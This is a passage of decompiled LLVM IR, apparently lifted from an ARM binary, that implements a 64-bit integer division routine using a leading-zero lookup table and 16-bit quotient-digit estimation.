  br i1 %v3_178e8, label %dec_label_pc_17b08, label %dec_label_pc_178ec

dec_label_pc_178ec:                               ; preds = %dec_label_pc_178e4
  %v3_178f0 = icmp ugt i32 %v0_17934, 16777214
  %v9_178f0 = icmp eq i32 %v0_17934, 16777215
  %v2_178f4 = xor i1 %v9_178f0, true
  %v3_178f4 = and i1 %v3_178f0, %v2_178f4
  br i1 %v3_178f4, label %bb134, label %bb135

bb134:                                            ; preds = %dec_label_pc_178ec
  br label %bb135

bb135:                                            ; preds = %dec_label_pc_178ec, %bb134
  %v1_1790469 = phi i32 [ 16777215, %dec_label_pc_178ec ], [ 24, %bb134 ]
  %v2_178f8 = xor i1 %v3_178f0, true
  %v3_178f8 = or i1 %v9_178f0, %v2_178f8
  br i1 %v3_178f8, label %bb136, label %bb137

bb136:                                            ; preds = %bb135
  br label %bb137

bb137:                                            ; preds = %bb135, %bb136
  %v1_1790468 = phi i32 [ %v1_1790469, %bb135 ], [ 16, %bb136 ]
  br i1 %v3_178f4, label %bb138, label %bb139

bb138:                                            ; preds = %bb137
  store i32 8, i32* @ip, align 4
  br label %bb139

bb139:                                            ; preds = %bb137, %bb138
  br i1 %v3_178f8, label %bb140, label %bb141

bb140:                                            ; preds = %bb139
  store i32 16, i32* @ip, align 4
  br label %bb141

bb141:                                            ; preds = %._crit_edge, %bb161, %bb139, %bb140
  %v1_17904 = phi i32 [ %v1_17904.pre, %._crit_edge ], [ 8, %bb161 ], [ %v1_1790468, %bb139 ], [ %v1_1790468, %bb140 ]
  %v6_17904 = lshr i32 %v0_17934, %v1_17904
  %v0_1790c = load i32, i32* %r8.global-to-local, align 4
  %v2_1790c = add i32 %v0_1790c, 36
  %v3_1790c = inttoptr i32 %v2_1790c to i32*
  %v4_1790c = load i32, i32* %v3_1790c, align 4
  %v2_17910 = add i32 %v4_1790c, %v6_17904
  %v3_17910 = inttoptr i32 %v2_17910 to i8*
  %v4_17910 = load i8, i8* %v3_17910, align 1
  %v6_17910 = zext i8 %v4_17910 to i32
  %v0_17914 = load i32, i32* @ip, align 4
  %v2_17914 = sub i32 %v0_17914, %v6_17910
  store i32 %v2_17914, i32* %sl.global-to-local, align 4
  %v9_17914 = icmp eq i32 %v0_17914, %v6_17910
  %v2_1791c = load i32, i32* @r7, align 4
  br i1 %v9_17914, label %.thread11, label %dec_label_pc_17930

.thread11:                                        ; preds = %bb141
  %v3_1791c = sub i32 %v2_1791c, %v0_17934
  store i32 %v3_1791c, i32* @r4, align 4
  %v4_17920 = urem i32 %v0_17934, 65536
  store i32 %v4_17920, i32* %r8.global-to-local, align 4
  %v4_17924 = udiv i32 %v0_17934, 65536
  store i32 %v4_17924, i32* @r7, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_179e8

dec_label_pc_17930:                               ; preds = %bb141
  %v6_17930 = shl i32 %v2_1791c, %v2_17914
  %v6_17934 = shl i32 %v0_17934, %v2_17914
  store i32 %v6_17934, i32* %r6.global-to-local, align 4
  %v1_17938 = sub i32 32, %v2_17914
  %v6_1793c = lshr i32 %v2_1791c, %v1_17938
  store i32 %v6_1793c, i32* @r4, align 4
  %v1_17940 = load i32, i32* %sb.global-to-local, align 4
  %v7_17940 = lshr i32 %v1_17940, %v1_17938
  %v8_17940 = or i32 %v7_17940, %v6_17930
  %v3_17944 = udiv i32 %v6_17934, 65536
  store i32 %v3_17944, i32* @r7, align 4
  store i32 %v3_17944, i32* @r1, align 4
  store i32 %v6_1793c, i32* @r0, align 4
  %v0_17954 = call i32 @function_1296c()
  %v0_17958 = load i32, i32* @r7, align 4
  store i32 %v0_17954, i32* %fp.global-to-local, align 4
  %v0_17960 = load i32, i32* @r4, align 4
  %v2_17964 = call i32 @function_12a68(i32 %v0_17960, i32 %v0_17958)
  %v0_17968 = load i32, i32* %r6.global-to-local, align 4
  %v3_1796c = urem i32 %v0_17968, 65536
  store i32 %v3_1796c, i32* %r8.global-to-local, align 4
  %v2_17970 = mul i32 %v0_17954, %v3_1796c
  %v3_17978 = udiv i32 %v8_17940, 65536
  %v4_1797c = mul i32 %v0_17958, 65536
  %v5_1797c = or i32 %v4_1797c, %v3_17978
  %tmp196 = icmp ugt i32 %v2_17970, %v5_1797c
  br i1 %tmp196, label %dec_label_pc_17988, label %dec_label_pc_17994

dec_label_pc_17988:                               ; preds = %dec_label_pc_17930
  %v2_17988 = add i32 %v0_17968, %v5_1797c
  %v3_17988 = icmp ult i32 %v2_17988, %v5_1797c
  %v1_1798c = add i32 %v0_17954, -1
  store i32 %v1_1798c, i32* %fp.global-to-local, align 4
  br i1 %v3_17988, label %dec_label_pc_17994, label %dec_label_pc_17ccc

dec_label_pc_17994:                               ; preds = %dec_label_pc_17930, %dec_label_pc_17ccc, %bb190, %dec_label_pc_17988
  %v1_17994 = phi i32 [ %v6_17cd4, %bb190 ], [ %v2_17988, %dec_label_pc_17988 ], [ %v5_1797c, %dec_label_pc_17930 ], [ %v2_17988, %dec_label_pc_17ccc ]
  %v2_17994 = sub i32 %v1_17994, %v2_17970
  store i32 %v2_17994, i32* @r4, align 4
  %v0_17998 = load i32, i32* @r7, align 4
  store i32 %v0_17998, i32* @r1, align 4
  store i32 %v2_17994, i32* @r0, align 4
  %v0_179a0 = call i32 @function_1296c()
  %v0_179a4 = load i32, i32* @r7, align 4
  store i32 %v0_179a0, i32* @r5, align 4
  %v0_179ac = load i32, i32* @r4, align 4
  %v2_179b0 = call i32 @function_12a68(i32 %v0_179ac, i32 %v0_179a4)
  %v0_179b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_179b4 = load i32, i32* @r5, align 4
  %v2_179b4 = mul i32 %v1_179b4, %v0_179b4
  %v3_179c0 = urem i32 %v8_17940, 65536
  %v4_179c4 = mul i32 %v0_179a4, 65536
  %v5_179c4 = or i32 %v4_179c4, %v3_179c0
  %tmp197 = icmp ugt i32 %v2_179b4, %v5_179c4
  br i1 %tmp197, label %dec_label_pc_179d0, label %dec_label_pc_179dc

dec_label_pc_179d0:                               ; preds = %dec_label_pc_17994
  %v1_179d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_179d0 = add i32 %v1_179d0, %v5_179c4
  %v3_179d0 = icmp ult i32 %v2_179d0, %v5_179c4
  %v1_179d4 = add i32 %v1_179b4, -1
  br i1 %v3_179d0, label %dec_label_pc_179dc, label %dec_label_pc_17cbc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_17994, %dec_label_pc_17cbc, %bb189, %dec_label_pc_179d0
  %v0_179e4 = phi i32 [ %v5_17cc0, %bb189 ], [ %v1_179d4, %dec_label_pc_179d0 ], [ %v1_179b4, %dec_label_pc_17994 ], [ %v1_179d4, %dec_label_pc_17cbc ]
  %v1_179e0 = phi i32 [ %v6_17cc4, %bb189 ], [ %v2_179d0, %dec_label_pc_179d0 ], [ %v5_179c4, %dec_label_pc_17994 ], [ %v2_179d0, %dec_label_pc_17cbc ]
  %v0_179dc = load i32, i32* %sb.global-to-local, align 4
  %v1_179dc = load i32, i32* %sl.global-to-local, align 4
  %v6_179dc = shl i32 %v0_179dc, %v1_179dc
  store i32 %v6_179dc, i32* %sb.global-to-local, align 4
  %v2_179e0 = sub i32 %v1_179e0, %v2_179b4
  store i32 %v2_179e0, i32* @r4, align 4
  %v1_179e4 = load i32, i32* %fp.global-to-local, align 4
  %v4_179e4 = mul i32 %v1_179e4, 65536
  %v5_179e4 = or i32 %v4_179e4, %v0_179e4
  store i32 %v5_179e4, i32* %fp.global-to-local, align 4
  %v0_179e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %.thread11, %dec_label_pc_179dc
  %v0_179ec = phi i32 [ %v3_1791c, %.thread11 ], [ %v2_179e0, %dec_label_pc_179dc ]
  %v0_179e8 = phi i32 [ %v4_17924, %.thread11 ], [ %v0_179e8.pre, %dec_label_pc_179dc ]
  store i32 %v0_179e8, i32* @r1, align 4
  store i32 %v0_179ec, i32* @r0, align 4
  %v0_179f0 = call i32 @function_1296c()
  %v0_179f4 = load i32, i32* @r7, align 4
  store i32 %v0_179f0, i32* %sl.global-to-local, align 4
  %v0_179fc = load i32, i32* @r4, align 4
  %v2_17a00 = call i32 @function_12a68(i32 %v0_179fc, i32 %v0_179f4)
  %v0_17a04 = load i32, i32* %r8.global-to-local, align 4
  %v2_17a04 = mul i32 %v0_179f0, %v0_17a04
  %v0_17a08 = load i32, i32* %sb.global-to-local, align 4
  %v3_17a08 = udiv i32 %v0_17a08, 65536
  %v4_17a0c = mul i32 %v0_179f4, 65536
  %v5_17a0c = or i32 %v3_17a08, %v4_17a0c
  %tmp198 = icmp ugt i32 %v2_17a04, %v5_17a0c
  br i1 %tmp198, label %dec_label_pc_17a18, label %.thread96

dec_label_pc_17a18:                               ; preds = %dec_label_pc_179e8
  %v1_17a18 = load i32, i32* %r6.global-to-local, align 4
  %v2_17a18 = add i32 %v1_17a18, %v5_17a0c
  %v3_17a18 = icmp ult i32 %v2_17a18, %v5_17a0c
  %v1_17a1c = add i32 %v0_179f0, -1
  store i32 %v1_17a1c, i32* %sl.global-to-local, align 4
  br i1 %v3_17a18, label %.thread96, label %dec_label_pc_17a24

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a18
  %tmp199 = icmp ugt i32 %v2_17a04, %v2_17a18
  br i1 %tmp199, label %bb143, label %.thread96

bb143:                                            ; preds = %dec_label_pc_17a24
  %v5_17a28 = add i32 %v0_179f0, -2
  store i32 %v5_17a28, i32* %sl.global-to-local, align 4
  %v6_17a2c = add i32 %v2_17a18, %v1_17a18
  br label %.thread96

.thread96:                                        ; preds = %dec_label_pc_179e8, %dec_label_pc_17a24, %dec_label_pc_17a18, %bb143
  %v1_17a30 = phi i32 [ %v2_17a18, %dec_label_pc_17a18 ], [ %v5_17a0c, %dec_label_pc_179e8 ], [ %v6_17a2c, %bb143 ], [ %v2_17a18, %dec_label_pc_17a24 ]
  %v2_17a30 = sub i32 %v1_17a30, %v2_17a04
  store i32 %v2_17a30, i32* @r4, align 4
  %v0_17a34 = load i32, i32* @r7, align 4
  store i32 %v0_17a34, i32* @r1, align 4
  store i32 %v2_17a30, i32* @r0, align 4
  %v0_17a3c = call i32 @function_1296c()
  %v0_17a40 = load i32, i32* @r7, align 4
  store i32 %v0_17a3c, i32* @r5, align 4
  %v0_17a48 = load i32, i32* @r4, align 4
  %v2_17a4c = call i32 @function_12a68(i32 %v0_17a48, i32 %v0_17a40)
  %v0_17a50 = load i32, i32* %r8.global-to-local, align 4
  %v1_17a50 = load i32, i32* @r5, align 4
  %v2_17a50 = mul i32 %v1_17a50, %v0_17a50
  %v0_17a54 = load i32, i32* %sb.global-to-local, align 4
  %v3_17a58 = urem i32 %v0_17a54, 65536
  %v4_17a5c = mul i32 %v0_17a40, 65536
  %v5_17a5c = or i32 %v3_17a58, %v4_17a5c
  %tmp200 = icmp ugt i32 %v2_17a50, %v5_17a5c
  br i1 %tmp200, label %dec_label_pc_17a68, label %bb145

dec_label_pc_17a68:                               ; preds = %.thread96
  %v1_17a68 = load i32, i32* %r6.global-to-local, align 4
  %v2_17a68 = add i32 %v1_17a68, %v5_17a5c
  %v3_17a68 = icmp ult i32 %v2_17a68, %v5_17a5c
  %v1_17a6c = add i32 %v1_17a50, -1
  br i1 %v3_17a68, label %bb145, label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a68
  %tmp201 = icmp ugt i32 %v2_17a50, %v2_17a68
  br i1 %tmp201, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_17a74
  %v5_17a78 = add i32 %v1_17a50, -2
  br label %bb145

bb145:                                            ; preds = %.thread96, %dec_label_pc_17a68, %dec_label_pc_17a74, %bb144
  %v0_17a7c = phi i32 [ %v1_17a6c, %dec_label_pc_17a68 ], [ %v1_17a50, %.thread96 ], [ %v1_17a6c, %dec_label_pc_17a74 ], [ %v5_17a78, %bb144 ]
  %v1_17a7c = load i32, i32* %sl.global-to-local, align 4
  %v4_17a7c = mul i32 %v1_17a7c, 65536
  %v5_17a7c = or i32 %v4_17a7c, %v0_17a7c
  br label %dec_label_pc_178a0

dec_label_pc_17a88:                               ; preds = %dec_label_pc_1788c
  %v3_17a8c = icmp ult i32 %v1_17ac0, 65534
  br i1 %v3_17a8c, label %dec_label_pc_17b20, label %dec_label_pc_17a90

dec_label_pc_17a90:                               ; preds = %dec_label_pc_17a88
  %v3_17a94 = icmp ugt i32 %v1_17ac0, 16777214
  %v9_17a94 = icmp eq i32 %v1_17ac0, 16777215
  %v2_17a98 = xor i1 %v9_17a94, true
  %v3_17a98 = and i1 %v3_17a94, %v2_17a98
  br i1 %v3_17a98, label %bb147, label %bb148

bb147:                                            ; preds = %dec_label_pc_17a90
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17a90, %bb147
  %v1_17aa031 = phi i32 [ 16777215, %dec_label_pc_17a90 ], [ 24, %bb147 ]
  %v2_17a9c = xor i1 %v3_17a94, true
  %v3_17a9c = or i1 %v9_17a94, %v2_17a9c
  br i1 %v3_17a9c, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_17aa0 = phi i32 [ %v1_17aa031, %bb148 ], [ 16, %bb149 ]
  %v2_17aa0 = add nsw i32 %v1_17aa0, -1
  %v3_17aa0 = shl i32 1, %v2_17aa0
  %v4_17aa0 = and i32 %v3_17aa0, %v1_17ac0
  %v5_17aa0 = icmp ne i32 %v4_17aa0, 0
  %v6_17aa0 = lshr i32 %v1_17ac0, %v1_17aa0
  %v4_17aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_17aac = add i32 %v4_17aa8, %v6_17aa0
  %v3_17aac = inttoptr i32 %v2_17aac to i8*
  %v4_17aac = load i8, i8* %v3_17aac, align 1
  %v6_17aac = zext i8 %v4_17aac to i32
  %v3_17ab0 = and i1 %v5_17aa0, %v2_17a98
  br i1 %v3_17ab0, label %bb151, label %bb152

bb151:                                            ; preds = %bb150
  store i32 8, i32* @lr, align 4
  br label %bb152

bb152:                                            ; preds = %bb150, %bb151
  %v0_17ab833 = phi i32 [ %v27_17744, %bb150 ], [ 8, %bb151 ]
  %v2_17ab4 = xor i1 %v5_17aa0, true
  %v3_17ab4 = or i1 %v9_17a94, %v2_17ab4
  br i1 %v3_17ab4, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 16, i32* @lr, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %v0_17ab8 = phi i32 [ %v0_17ab833, %bb152 ], [ 16, %bb153 ]
  %v2_17ab8 = sub i32 %v0_17ab8, %v6_17aac
  store i32 %v2_17ab8, i32* %fp.global-to-local, align 4
  %v9_17ab8 = icmp eq i32 %v0_17ab8, %v6_17aac
  br i1 %v9_17ab8, label %dec_label_pc_17ac0, label %dec_label_pc_17b4c

dec_label_pc_17ac0:                               ; preds = %bb154, %bb169
  %v3_17ac0 = icmp uge i32 %v1_177cc, %v1_17ac0
  %v2_17ac4 = xor i1 %v3_17ac0, true
  %v3_17ac4 = or i1 %v9_1788c, %v2_17ac4
  br i1 %v3_17ac4, label %bb156, label %bb157

bb156:                                            ; preds = %dec_label_pc_17ac0
  %v7_17ac4 = icmp ult i32 %v0_1778c, %v0_178d4
  br i1 %v7_17ac4, label %dec_label_pc_17898, label %.thread13

bb157:                                            ; preds = %dec_label_pc_17ac0
  br i1 %v3_17ac0, label %.thread13, label %dec_label_pc_17898

.thread13:                                        ; preds = %bb156, %bb157
  br label %dec_label_pc_178a0

dec_label_pc_17ad8:                               ; preds = %dec_label_pc_17744
  store i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32* %r8.global-to-local, align 4
  %v0_1776884 = load i32, i32* @r2, align 4
  store i32 %v0_1776884, i32* @r4, align 4
  %v0_1776c85 = load i32, i32* @r3, align 4
  %v0_17ad8 = load i32, i32* @r0, align 4
  %v1_17ad8 = sub i32 0, %v0_17ad8
  store i32 %v1_17ad8, i32* @r0, align 4
  %v2_17ad8 = icmp eq i32 %v0_17ad8, 0
  %v2_17adc = icmp eq i1 %v2_17ad8, false
  %v5_17adc = sext i1 %v2_17adc to i32
  %v6_17adc = sub i32 %v5_17adc, %v0_17750
  store i32 -1, i32* @ip, align 4
  %v1_17ae4 = icmp slt i32 %v0_1776c85, 0
  br i1 %v1_17ae4, label %dec_label_pc_17af0, label %dec_label_pc_17780

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ad8, %dec_label_pc_17778
  %v0_1776c89 = phi i32 [ %v0_1776c85, %dec_label_pc_17ad8 ], [ %v0_1776c, %dec_label_pc_17778 ]
  %v0_1776886 = phi i32 [ %v0_1776884, %dec_label_pc_17ad8 ], [ %v0_17768, %dec_label_pc_17778 ]
  %v0_1778428 = phi i32 [ %v6_17adc, %dec_label_pc_17ad8 ], [ %v0_17750, %dec_label_pc_17778 ]
  %stack_var_-56.2 = phi i32 [ -1, %dec_label_pc_17ad8 ], [ 0, %dec_label_pc_17778 ]
  %v1_17af0 = sub i32 0, %v0_1776886
  store i32 %v1_17af0, i32* @r4, align 4
  %v2_17af0 = icmp eq i32 %v0_1776886, 0
  %v2_17af4 = icmp eq i1 %v2_17af0, false
  %v5_17af4 = sext i1 %v2_17af4 to i32
  %v6_17af4 = sub i32 %v5_17af4, %v0_1776c89
  %v1_17afc = sub nsw i32 -1, %stack_var_-56.2
  br label %dec_label_pc_17780

dec_label_pc_17b08:                               ; preds = %dec_label_pc_178e4
  %v2_17b08 = icmp ugt i32 %v0_17934, 254
  %v7_17b08 = icmp eq i32 %v0_17934, 255
  %v2_17b0c = xor i1 %v7_17b08, true
  %v3_17b0c = and i1 %v2_17b08, %v2_17b0c
  br i1 %v3_17b0c, label %bb158, label %bb159

bb158:                                            ; preds = %dec_label_pc_17b08
  store i32 24, i32* @ip, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_17b08, %bb158
  %v2_17b10 = xor i1 %v2_17b08, true
  %v3_17b10 = or i1 %v7_17b08, %v2_17b10
  br i1 %v3_17b10, label %bb160, label %.thread98

bb160:                                            ; preds = %bb159
  store i32 32, i32* @ip, align 4
  store i32 0, i32* @r3, align 4
  br label %.thread98

.thread98:                                        ; preds = %bb159, %bb160
  br i1 %v3_17b0c, label %bb161, label %._crit_edge

._crit_edge:                                      ; preds = %.thread98
  %v1_17904.pre = load i32, i32* @r3, align 4
  br label %bb141

bb161:                                            ; preds = %.thread98
  br label %bb141

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17a88
  %v2_17b20 = icmp ugt i32 %v1_17ac0, 254
  %v7_17b20 = icmp eq i32 %v1_17ac0, 255
  %v2_17b24 = xor i1 %v7_17b20, true
  %v3_17b24 = and i1 %v2_17b20, %v2_17b24
  br i1 %v3_17b24, label %bb162, label %bb163

bb162:                                            ; preds = %dec_label_pc_17b20
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_17b20, %bb162
  %v1_17b2c35 = phi i32 [ %v0_1776c90, %dec_label_pc_17b20 ], [ 8, %bb162 ]
  %v2_17b28 = xor i1 %v2_17b20, true
  %v3_17b28 = or i1 %v7_17b20, %v2_17b28
  br i1 %v3_17b28, label %bb164, label %bb165

bb164:                                            ; preds = %bb163
  br label %bb165

bb165:                                            ; preds = %bb163, %bb164
  %v1_17b2c = phi i32 [ %v1_17b2c35, %bb163 ], [ 0, %bb164 ]
  %v2_17b2c = add i32 %v1_17b2c, -1
  %v3_17b2c = shl i32 1, %v2_17b2c
  %v4_17b2c = and i32 %v3_17b2c, %v1_17ac0
  %v5_17b2c = icmp ne i32 %v4_17b2c, 0
  %v6_17b2c = lshr i32 %v1_17ac0, %v1_17b2c
  %v4_17b34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_17b38 = add i32 %v4_17b34, %v6_17b2c
  %v3_17b38 = inttoptr i32 %v2_17b38 to i8*
  %v4_17b38 = load i8, i8* %v3_17b38, align 1
  %v6_17b38 = zext i8 %v4_17b38 to i32
  %v3_17b3c = and i1 %v5_17b2c, %v2_17b24
  br i1 %v3_17b3c, label %bb166, label %bb167

bb166:                                            ; preds = %bb165
  store i32 24, i32* @lr, align 4
  br label %bb167

bb167:                                            ; preds = %bb165, %bb166
  %v0_17b4437 = phi i32 [ %v27_17744, %bb165 ], [ 24, %bb166 ]
  %v2_17b40 = xor i1 %v5_17b2c, true
  %v3_17b40 = or i1 %v7_17b20, %v2_17b40
  br i1 %v3_17b40, label %bb168, label %bb169

bb168:                                            ; preds = %bb167
  store i32 32, i32* @lr, align 4
  br label %bb169

bb169:                                            ; preds = %bb167, %bb168
  %v0_17b44 = phi i32 [ %v0_17b4437, %bb167 ], [ 32, %bb168 ]
  %v2_17b44 = sub i32 %v0_17b44, %v6_17b38
  store i32 %v2_17b44, i32* %fp.global-to-local, align 4
  %v9_17b44 = icmp eq i32 %v0_17b44, %v6_17b38
  br i1 %v9_17b44, label %dec_label_pc_17ac0, label %dec_label_pc_17b4c

dec_label_pc_17b4c:                               ; preds = %bb154, %bb169
  %v1_17b58 = phi i32 [ %v2_17ab8, %bb154 ], [ %v2_17b44, %bb169 ]
  %v6_17b4c = shl i32 %v1_17ac0, %v1_17b58
  %v1_17b50 = sub i32 32, %v1_17b58
  %v7_17b54 = lshr i32 %v0_178d4, %v1_17b50
  %v8_17b54 = or i32 %v7_17b54, %v6_17b4c
  store i32 %v8_17b54, i32* %r8.global-to-local, align 4
  %v6_17b58 = shl i32 %v1_177cc, %v1_17b58
  %v6_17b5c = lshr i32 %v1_177cc, %v1_17b50
  store i32 %v6_17b5c, i32* @r4, align 4
  %v7_17b60 = lshr i32 %v0_1778c, %v1_17b50
  %v8_17b60 = or i32 %v7_17b60, %v6_17b58
  %v3_17b64 = udiv i32 %v8_17b54, 65536
  store i32 %v3_17b64, i32* %sl.global-to-local, align 4
  store i32 %v3_17b64, i32* @r1, align 4
  store i32 %v6_17b5c, i32* @r0, align 4
  %v0_17b74 = call i32 @function_1296c()
  %v0_17b80 = load i32, i32* @r4, align 4
  %v2_17b84 = call i32 @function_12a68(i32 %v0_17b80, i32 %v3_17b64)
  %v0_17b88 = load i32, i32* %r8.global-to-local, align 4
  %v3_17b90 = urem i32 %v0_17b88, 65536
  store i32 %v3_17b90, i32* @r7, align 4
  %v2_17b94 = mul i32 %v3_17b90, %v0_17b74
  %v3_17b9c = udiv i32 %v8_17b60, 65536
  %v4_17ba0 = mul nuw i32 %v3_17b64, 65536
  %v5_17ba0 = or i32 %v4_17ba0, %v3_17b9c
  %v9_17ba4 = icmp eq i32 %v2_17b94, %v5_17ba0
  %v0_17ba8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17ba8 = load i32, i32* %fp.global-to-local, align 4
  %v2_17ba8 = add i32 %v1_17ba8, -1
  %v3_17ba8 = lshr i32 -2147483648, %v2_17ba8
  %v4_17ba8 = and i32 %v3_17ba8, %v0_17ba8
  %v6_17ba8 = shl i32 %v0_17ba8, %v1_17ba8
  store i32 %v6_17ba8, i32* @r5, align 4
  %v2_17bac = icmp eq i32 %v4_17ba8, 0
  %v3_17bac = or i1 %v9_17ba4, %v2_17bac
  br i1 %v3_17bac, label %dec_label_pc_17bc4, label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17b4c
  %v2_17bb4 = add i32 %v0_17b88, %v5_17ba0
  %v3_17bb4 = icmp ult i32 %v2_17bb4, %v5_17ba0
  %v1_17bb8 = add i32 %v0_17b74, -1
  br i1 %v3_17bb4, label %dec_label_pc_17bc4, label %dec_label_pc_17ca8

dec_label_pc_17bc4:                               ; preds = %.thread104, %dec_label_pc_17bb0, %dec_label_pc_17b4c
  %v1_17bc4 = phi i32 [ %v5_17ba0, %dec_label_pc_17b4c ], [ %v2_17bb4, %dec_label_pc_17bb0 ], [ %v1_17bc441, %.thread104 ]
  %stack_var_-52.0 = phi i32 [ %v0_17b74, %dec_label_pc_17b4c ], [ %v1_17bb8, %dec_label_pc_17bb0 ], [ %v4_17cb4.v1_17bb8, %.thread104 ]
  %v2_17bc4 = sub i32 %v1_17bc4, %v2_17b94
  store i32 %v2_17bc4, i32* @r4, align 4
  %v0_17bc8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_17bc8, i32* @r1, align 4
  store i32 %v2_17bc4, i32* @r0, align 4
  %v0_17bd0 = call i32 @function_1296c()
  store i32 %v0_17bd0, i32* %r6.global-to-local, align 4
  %v0_17bdc = load i32, i32* @r4, align 4
  %v2_17be0 = call i32 @function_12a68(i32 %v0_17bdc, i32 %v0_17bc8)
  %v0_17be4 = load i32, i32* @r7, align 4
  %v2_17be4 = mul i32 %v0_17bd0, %v0_17be4
  %v3_17bf0 = urem i32 %v8_17b60, 65536
  %v4_17bf4 = mul i32 %v0_17bc8, 65536
  %v5_17bf4 = or i32 %v4_17bf4, %v3_17bf0
  %tmp202 = icmp ugt i32 %v2_17be4, %v5_17bf4
  br i1 %tmp202, label %dec_label_pc_17c00, label %dec_label_pc_17c0c

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17bc4
  %v1_17c00 = load i32, i32* %r8.global-to-local, align 4
  %v2_17c00 = add i32 %v1_17c00, %v5_17bf4
  %v3_17c00 = icmp ult i32 %v2_17c00, %v5_17bf4
  %v1_17c04 = add i32 %v0_17bd0, -1
  store i32 %v1_17c04, i32* %r6.global-to-local, align 4
  br i1 %v3_17c00, label %dec_label_pc_17c0c, label %dec_label_pc_17c98

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17bc4, %dec_label_pc_17c98, %bb187, %dec_label_pc_17c00
  %v0_17c14 = phi i32 [ %v5_17ca0, %bb187 ], [ %v1_17c04, %dec_label_pc_17c00 ], [ %v0_17bd0, %dec_label_pc_17bc4 ], [ %v1_17c04, %dec_label_pc_17c98 ]
  %v1_17c10 = phi i32 [ %v6_17c9c, %bb187 ], [ %v2_17c00, %dec_label_pc_17c00 ], [ %v5_17bf4, %dec_label_pc_17bc4 ], [ %v2_17c00, %dec_label_pc_17c98 ]
  %v2_17c10 = sub i32 %v1_17c10, %v2_17be4
  %v4_17c14 = mul i32 %stack_var_-52.0, 65536
  %v5_17c14 = or i32 %v0_17c14, %v4_17c14
  %v3_17c18 = udiv i32 %v5_17c14, 65536
  %v0_17c1c = load i32, i32* @r5, align 4
  %v3_17c1c = udiv i32 %v0_17c1c, 65536
  %tmp203 = mul i32 %v3_17c18, -65536
  %v5_17c20 = add i32 %tmp203, -1
  %v6_17c20 = and i32 %v5_17c14, %v5_17c20
  %tmp204 = mul i32 %v3_17c1c, -65536
  %v5_17c24 = add i32 %tmp204, -1
  %v6_17c24 = and i32 %v0_17c1c, %v5_17c24
  %v2_17c28 = mul i32 %v6_17c24, %v6_17c20
  %v2_17c2c = mul i32 %v6_17c24, %v3_17c18
  %v2_17c30 = mul i32 %v3_17c1c, %v6_17c20
  %v2_17c34 = mul nuw i32 %v3_17c1c, %v3_17c18
  %v2_17c38 = add i32 %v2_17c2c, %v2_17c30
  %v3_17c38 = icmp ult i32 %v2_17c38, %v2_17c2c
  br i1 %v3_17c38, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_17c0c
  %v2_17c3c = add i32 %v2_17c34, 65536
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_17c0c, %bb171
  %v0_17c44 = phi i32 [ %v2_17c34, %dec_label_pc_17c0c ], [ %v2_17c3c, %bb171 ]
  %v4_17c40 = mul i32 %v2_17c38, 65536
  %v5_17c40 = add i32 %v4_17c40, %v2_17c28
  %v2_17c44 = and i32 %v2_17c38, 32768
  %v3_17c44 = icmp ne i32 %v2_17c44, 0
  %v4_17c44 = udiv i32 %v2_17c38, 65536
  %v7_17c44 = zext i1 %v3_17c44 to i32
  %v6_17c44 = add nuw nsw i32 %v7_17c44, %v4_17c44
  %v8_17c44 = add i32 %v6_17c44, %v0_17c44
  %v3_17c48 = icmp ult i32 %v2_17c10, %v8_17c44
  br i1 %v3_17c48, label %dec_label_pc_17c70, label %dec_label_pc_17c50

dec_label_pc_17c50:                               ; preds = %bb172
  %v9_17c48 = icmp eq i32 %v2_17c10, %v8_17c44
  %. = zext i1 %v9_17c48 to i32
  %v1_17c58 = load i32, i32* %sb.global-to-local, align 4
  %v2_17c58 = load i32, i32* %fp.global-to-local, align 4
  %v7_17c58 = shl i32 %v1_17c58, %v2_17c58
  %v9_17c58 = icmp uge i32 %v5_17c40, %v7_17c58
  %v15_17c58 = icmp eq i32 %v5_17c40, %v7_17c58
  %v2_17c5c = xor i1 %v9_17c58, true
  %v3_17c5c = or i1 %v15_17c58, %v2_17c5c
  br i1 %v3_17c5c, label %bb175, label %bb176

bb175:                                            ; preds = %dec_label_pc_17c50
  br label %bb176

bb176:                                            ; preds = %dec_label_pc_17c50, %bb175
  %v4_17c60 = phi i32 [ %., %dec_label_pc_17c50 ], [ 0, %bb175 ]
  %v2_17c60 = xor i1 %v15_17c58, true
  %v3_17c60 = and i1 %v9_17c58, %v2_17c60
  br i1 %v3_17c60, label %bb177, label %thread-pre-split

bb177:                                            ; preds = %bb176
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb176, %bb177
  %v2_17c64 = icmp eq i32 %v4_17c60, 0
  br i1 %v2_17c64, label %bb178, label %dec_label_pc_17c70

bb178:                                            ; preds = %thread-pre-split
  br label %dec_label_pc_178a0

dec_label_pc_17c70:                               ; preds = %bb172, %thread-pre-split
  %v1_17c70 = add i32 %v5_17c14, -1
  br label %dec_label_pc_178a0

